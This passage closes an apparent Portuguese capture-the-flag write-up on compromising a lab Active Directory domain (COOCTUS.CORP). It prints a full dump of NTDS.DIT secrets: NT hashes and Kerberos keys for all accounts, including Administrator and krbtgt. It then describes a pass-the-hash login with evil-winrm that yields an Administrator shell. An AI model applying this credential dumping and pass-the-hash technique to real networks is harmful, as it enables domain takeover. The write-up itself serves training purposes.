 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.'</span>,k
NL<span class="nv">$KM</span>:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP<span class="se">\V</span>isitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP<span class="se">\m</span>ark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP<span class="se">\J</span>eff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP<span class="se">\S</span>pooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP<span class="se">\S</span>teve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP<span class="se">\H</span>oward:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP<span class="se">\a</span>dmCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP<span class="se">\F</span>awaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP<span class="se">\k</span>aren:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP<span class="se">\c</span>ryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP<span class="se">\y</span>umeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP<span class="se">\p</span>ars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP<span class="se">\k</span>evin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP<span class="se">\j</span>on:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP<span class="se">\V</span>arg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP<span class="se">\e</span>van:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP<span class="se">\B</span>en:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP<span class="se">\D</span>avid:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP<span class="se">\p</span>assword-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:8974754c17974ff870762db617c2b60c:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP<span class="se">\V</span>isitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP<span class="se">\V</span>isitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP<span class="se">\V</span>isitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP<span class="se">\m</span>ark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP<span class="se">\m</span>ark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP<span class="se">\m</span>ark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP<span class="se">\J</span>eff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP<span class="se">\J</span>eff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP<span class="se">\J</span>eff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP<span class="se">\S</span>pooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP<span class="se">\S</span>pooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP<span class="se">\S</span>pooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP<span class="se">\S</span>teve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP<span class="se">\S</span>teve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP<span class="se">\S</span>teve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP<span class="se">\H</span>oward:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP<span class="se">\H</span>oward:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP<span class="se">\H</span>oward:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP<span class="se">\a</span>dmCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP<span class="se">\a</span>dmCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP<span class="se">\a</span>dmCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP<span class="se">\F</span>awaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP<span class="se">\F</span>awaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP<span class="se">\F</span>awaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP<span class="se">\k</span>aren:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP<span class="se">\k</span>aren:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP<span class="se">\k</span>aren:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP<span class="se">\c</span>ryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP<span class="se">\c</span>ryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP<span class="se">\c</span>ryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP<span class="se">\y</span>umeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP<span class="se">\y</span>umeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP<span class="se">\y</span>umeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP<span class="se">\p</span>ars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP<span class="se">\p</span>ars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP<span class="se">\p</span>ars:des-cbc-md5:15d552643220868a
COOCTUS.CORP<span class="se">\k</span>evin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP<span class="se">\k</span>evin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP<span class="se">\k</span>evin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP<span class="se">\j</span>on:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP<span class="se">\j</span>on:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP<span class="se">\j</span>on:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP<span class="se">\V</span>arg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP<span class="se">\V</span>arg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP<span class="se">\V</span>arg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP<span class="se">\e</span>van:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP<span class="se">\e</span>van:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP<span class="se">\e</span>van:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP<span class="se">\B</span>en:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
COOCTUS.CORP<span class="se">\B</span>en:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP<span class="se">\B</span>en:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP<span class="se">\D</span>avid:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP<span class="se">\D</span>avid:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP<span class="se">\D</span>avid:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP<span class="se">\p</span>assword-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP<span class="se">\p</span>assword-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP<span class="se">\p</span>assword-reset:des-cbc-md5:343d2c5e01b5a74f
DC<span class="nv">$:</span>aes256-cts-hmac-sha1-96:b8599ddadc3aab581c0d8f4413a0011cfd5575455219e9a73a688695a337a02b
DC<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bc4fd5baa5e5cd088359ae6364df583d
DC<span class="nv">$:</span>des-cbc-md5:c1fd9ece52f25e7a
</code></pre></div></div>
<p>E conseguimos o dump de todas as hashes em cache, inclusive do <code class="language-plaintext highlighter-rouge">Administrator</code>!!!</p>

<p>Em posse da hash do Administrator, podemos utilizar o <code class="language-plaintext highlighter-rouge">evil-winrm</code> par nos autenticar com pass the hash.</p>

<p><img src="/img/thm/thm-crocccrew-9.png" /></p>

<p>E conseguimos nosso shell com o usuário Administrator!!!</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">C:\Shares\Home&gt;</code> encontramos todas as  duas hashes de usuários privilegiados.</p>

<p><img src="/img/thm/thm-crocccrew-10.png" /></p>

<p>Em <code class="language-plaintext highlighter-rouge">C:\Perflogs\Admin&gt;</code> encontramos a flag <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>

<p><img src="/img/thm/thm-crocccrew-11.png" /></p>

<p><br /></p>

<p>E comprometemos o server!!
<br /></p>

<p><img src="/htb/hackerman.gif" /></p>

